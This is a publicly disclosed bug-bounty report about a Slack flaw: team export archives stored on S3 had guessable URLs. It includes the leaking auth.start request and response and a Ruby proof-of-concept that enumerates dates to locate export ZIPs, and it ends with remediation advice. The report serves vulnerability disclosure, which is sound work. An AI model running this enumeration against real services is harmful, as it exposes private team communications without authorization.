@@ -1,0 +1,76 @@
+ReportLink:https://hackerone.com/reports/2746
+WeaknessName:Improper Authentication - Generic
+Reporter:https://hackerone.com/jobert
+ReportedTo:Slack(slack)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:09.12.2014 20:34:59
+
+Summary:
+
+The URLs that are used to download the exports can be guessed easily by an attacker. The location of the export file is based on a date, a team ID and a team name:
+
+```
+http://s3-us-west-2.amazonaws.com/slack-files2/<team_id>/export/<date>/<name>%20Slack%20export%20<date>.zip
+```
+
+The information an attacker needs, is the team its name and ID (the date needs to be enumerated). The information can be obtained due to a minor issue in the API (authentication). The following steps can be used to reproduce the issue.
+
+#Step 1: obtain team ID and team name
+The team ID and team name can be obtained by abusing some minor information leakage in the `auth.start` API call. The following request and response give an example.
+
+**Request**
+
+```
+POST /api/auth.start HTTP/1.1
+...
+
+email=jobert@hackerone.com
+```
+
+**Response**
+
+```
+HTTP/1.1 200 OK
+...
+
+{"ok":true,"email":"jobert@hackerone.com","domain":"hackerone.com","users":[{"url":"https:\/\/hackerone.slack.com\/","team":"HackerOne","user":"jobert","team_id":"T0254389F","user_id":"U0254GYNR"}],"teams":[],"create":"https:\/\/slack.com\/create?email=jobert%40hackerone.com"}
+```
+
+As can be seen in the JSON response, it contains the team ID (`T0254389F`) and a name (`HackerOne`) we need for the download links.
+
+#Step 2: scrape S3
+I wrote a rough PoC that scrapes S3 and shows the found exports (not something I'd use, just something I wrote for demonstration purposes -- feel free to use the team ID and name I mentioned before to check it out). 
+
+``` ruby
+require 'date'
+require 'net/http'
+require 'uri'
+
+team_id = ARGV[0]
+team_name = ARGV[1]
+
+def create_export_url(team_id, team_name, date)
+  date_dir  = date.strftime '%Y-%m-%d'
+  date_file = date.strftime('%b %-d %Y').gsub ' ', '%20'
+
+  "http://s3-us-west-2.amazonaws.com/slack-files2/#{team_id}/"\
+  "export/#{date_dir}/#{team_name}%20Slack%20export%20#{date_file}.zip"
+end
+
+date = Date.parse 'March 2nd, 2014'
+
+365.times do
+  uri      = URI create_export_url(team_id, team_name, date)
+  response = Net::HTTP.get_response uri
+
+  if response.is_a? Net::HTTPOK
+    puts "FOUND AN EXPORT: #{uri}"
+  end
+
+  date -= 1
+end
+```
+
+To avoid these kind of issues, you could generate a link that [expires within a certain amount](http://css-tricks.com/snippets/php/generate-expiring-amazon-s3-link/) of time (let's say, `<time-export-completed>+30m`) or use random values in the filename if expiring is not an option (make sure you don't solely rely on "public domain info").
